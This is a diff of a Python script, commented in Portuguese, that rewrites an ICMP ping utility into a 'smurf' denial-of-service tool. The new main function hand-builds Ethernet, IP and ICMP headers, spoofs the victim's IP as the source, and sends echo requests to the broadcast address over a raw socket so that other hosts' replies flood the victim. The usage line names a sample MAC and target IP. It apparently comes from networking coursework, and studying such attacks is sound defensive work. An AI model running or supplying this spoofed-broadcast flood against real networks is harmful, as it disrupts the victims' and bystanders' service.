@@ -1,9 +1,12 @@
 #Envia um pacote ICMP Echo Request para outra maquina
 
-#Exemplo de uso: python ping.py 10.0.0.1
+#Exemplo de uso: python3 smurf.py a4:1f:72:f5:90:b7 10.0.2.15
 
 import struct
 import socket
+import sys
+#===============================================================
+#funcoes auxiliares
 
 # Checksum quebra todo o header em numeros de 2 bytes (unsigned shorts) e 
 # soma todos eles entregando como resultado um unsigned short. Se ao final 
@@ -14,7 +17,7 @@ import socket
 # um short (zero ficaria 0xffffffff por exemplo). Para evitar complicacoes, 
 # uma operacao and eh usada com uma mascara 0xffff a fim de manter apenas os
 # primeiros 16 bits relevantes.
-def checksum(header):
+def checksum_icmp(header):
   shorts = struct.unpack('!HHHH', header)
   sum = 0
   for n in shorts:
@@ -22,11 +25,18 @@ def checksum(header):
   sum = sum + sum>>16 #se houver carry, soma-o como se fosse um novo numero
   return (~sum) & 0xffff
 
+def checksum_ip(header):
+  shorts = struct.unpack('!HHHHHHHHHH', header)
+  sum = 0
+  for n in shorts:
+    sum = sum + n
+  sum = sum + sum>>16 #se houver carry, soma-o como se fosse um novo numero
+  return (~sum) & 0xffff
+
+# mac = string contendo um endereco mac
+# retorno = string em que cada caractere corresponde a um byte do mac
 def mac2bytes(mac):
-  bytes = ''
-  for c in mac.split(':'):
-    bytes = bytes + c.decode('hex')
-  return bytes
+  return bytes.fromhex((mac.replace(':', '')))
 
 def string2hexip(sip):
   ns = sip.split('.')
@@ -34,57 +44,70 @@ def string2hexip(sip):
   for n in ns:
     ns2.append(int(n))
   return struct.pack('!BBBB', ns2[0], ns2[1], ns2[2], ns2[3])
+  
+def string2bytesip(ip):
+  return bytes(map(int, ip.split('.')))
+#===============================================================
 
 
-if len(sys.argv) < 2:
-	print "Uso: python smurf.py <IP alvo>"
-  exit()
-
-#victim
-target_ip = socket.gethostbyname(sys.argv[1])
-
-#ethernet header
-source_mac = mac2bytes("a4:1f:72:f5:90:b7") #6B
-target_mac = mac2bytes() #6B TODO pegar o mac do roteador
-eth_type = #2B
-
-eth_header = 
 
 
-#ip header
-ver_ihl = 0xf0 #1B
-tos = 
-total_length
-source_ip = string2hexip(sys.argv[1]) #4B
-target_ip = string2hexip("255.255.255.255") #4B
-
-ip_header = 
 
 
-#icmp header
-type = 8
-code = 0
-checksum_zero = 0
-identifier = 0xffff
-sequence = 0x0123
-#payload = 'asdf'
+#===============================================================
+#main
 
-true_checksum = checksum(struct.pack('!BBHHH4s', type, code, checksum_zero, identifier, sequence))
-print true_checksum
-icmp_header = struct.pack('!BBHHH4s', type, code, true_checksum, identifier, sequence, payload)
+def main():
+  if len(sys.argv) < 3:
+	  print("Uso: python smurf.py <MAC deste host> <IP alvo>")
 
-print "icmp header: " + icmp_header
+  victim_ip = string2bytesip(sys.argv[2])
+  print(sys.argv[2])
+  print(type(victim_ip))
 
+  #ethernet header
+  source_mac = mac2bytes(sys.argv[1])
+  target_mac = mac2bytes("ff:ff:ff:ff:ff:ff") #6B
+  eth_type = 0x0800 #2B ipv4
+  print(type(target_mac))
+  print(type(source_mac))
+  eth_header = struct.pack("!6s6sH", target_mac, source_mac, eth_type)
 
-# Get ICMP code
-icmp = socket.getprotobyname("icmp")
+  #ip header
+  ver_ihl = 0x45 #1B 4: ipv4,  5: numero de palavras de 32 bits neste header
+  tos = 0 #1B
+  total_length = 84 #2B tamanho em bytes do header
+  identification = 1 #2B
+  flags_offset = 0x4000 #2B (bit don't fragment ligado)
+  ttl = 64 #1B
+  protocol = 1 #1B icmp
+  temp_checksum = 0 #2B
+  source_ip = victim_ip #4B spoof
+  broadcast_ip = string2bytesip("255.255.255.255") #4B
+  ip_header = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_length,
+                          identification, flags_offset, ttl, protocol,
+                          temp_checksum, source_ip, broadcast_ip)
+  true_checksum = checksum_ip(ip_header)
+  ip_header = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_length,
+                          identification, flags_offset, ttl, protocol,
+                          true_checksum, source_ip, broadcast_ip)
 
-# Create a raw socket
-try:
-  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
-except socket.error , msg:
-  print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
-  sys.exit()
+  #icmp header
+  icmp_type = 8 #1B
+  code = 0 #1B
+  temp_checksum = 0 #2B
+  identifier = 0xffff #2B
+  sequence = 0x0123 #2B
+  true_checksum = checksum_icmp(struct.pack('!BBHHH', icmp_type, code, temp_checksum, identifier, sequence))
+  icmp_header = struct.pack('!BBHHH', icmp_type, code, true_checksum, identifier, sequence)
 
-# Send echo request
-s.sendto(icmp_header, (target_ip,0))
+  #packet completo
+  packet = eth_header + ip_header + icmp_header
+
+  #abre socket
+  rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
+  rawSocket.bind(("enp0s3", socket.htons(0x0800)))
+  rawSocket.send(packet)
+
+if __name__== '__main__':
+  main()
